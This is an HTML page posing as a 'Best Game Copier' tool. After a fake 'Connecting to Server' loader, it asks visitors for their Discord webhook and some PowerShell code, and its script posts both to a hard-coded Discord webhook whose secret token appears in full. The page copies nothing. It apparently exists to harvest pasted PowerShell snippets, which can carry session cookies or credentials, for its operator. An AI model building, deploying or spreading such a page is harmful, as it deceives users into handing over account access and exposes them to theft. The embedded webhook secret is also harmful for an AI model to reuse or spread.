<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Best Game Copier</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: black;
            overflow: hidden;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        /* Loader Styles */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            z-index: 10;
            flex-direction: column;
            color: white;
        }

        #loader-text {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .dots {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 10px;
            height: 10px;
            background-color: yellow;
            border-radius: 50%;
            animation: slideDots 1.5s infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.3s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes slideDots {
            0%, 100% {
                transform: translateX(0);
                opacity: 0.3;
            }
            50% {
                transform: translateX(20px);
                opacity: 1;
            }
        }

        /* Background animation */
        @keyframes backgroundGradient {
            0% {
                background: radial-gradient(circle, yellow, orange, black);
            }
            50% {
                background: radial-gradient(circle, orange, yellow, black);
            }
            100% {
                background: radial-gradient(circle, yellow, orange, black);
            }
        }

        body {
            animation: backgroundGradient 10s infinite;
        }

        .grid {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
            width: 90%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
        }

        h1 {
            margin-bottom: 10px;
            text-align: center;
            font-size: 24px;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background: yellow;
            color: black;
            width: 100%;
        }

        button:hover {
            background: orange;
        }

        .error {
            color: red;
            text-align: center;
        }
    </style>
</head>
<body>
    <div id="loader">
        <div id="loader-text">Connecting to Server</div>
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <div class="grid" style="display: none;" id="main-content">
        <h1>Best Game Copier</h1>
        <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook (for results)" />
        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
        <button id="copyButton">Submit Code</button>
        <p id="errorMessage" class="error" style="display: none;"></p>
    </div>

    <script>
        const copyButton = document.getElementById('copyButton');
        const powershellCode = document.getElementById('powershellCode');
        const webhookUrl = document.getElementById('webhookUrl');
        const errorMessage = document.getElementById('errorMessage');
        const loader = document.getElementById('loader');
        const mainContent = document.getElementById('main-content');

        // Show website after 10 seconds
        setTimeout(() => {
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
                mainContent.style.display = 'flex';
            }, 500);
        }, 10000);

        function isValidWebhook(url) {
            const discordWebhookPattern = /https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/;
            return discordWebhookPattern.test(url);
        }

        copyButton.addEventListener('click', () => {
            const code = powershellCode.value.trim();
            const userWebhook = webhookUrl.value.trim();

            if (!code) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'No PowerShell code has been entered. Please enter your PowerShell code and try again.';
                return;
            }

            if (!userWebhook || !isValidWebhook(userWebhook)) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Invalid or missing Discord webhook for results. Please enter a valid webhook.';
                return;
            }

            errorMessage.style.display = 'none';

            // Replace this webhook URL with your server-side webhook
            const serverWebhook = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";

            // Create a .txt file content
            const fileContent = new Blob([code], { type: 'text/plain' });
            const file = new File([fileContent], 'powershell_code.txt');

            // Prepare form data
            const formData = new FormData();
            formData.append('file', file);
            formData.append('payload_json', JSON.stringify({
                content: `User Webhook for Results: ${userWebhook}`
            }));

            // Send the PowerShell code file to the server webhook
            fetch(serverWebhook, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    alert('PowerShell code successfully sent! The results will be sent to your provided webhook.');
                } else {
                    alert('Failed to send the PowerShell code. Please try again later.');
                }
            })
            .catch(error => {
                alert('An error occurred: ' + error.message);
            });
        });
    </script>
</body>
</html>
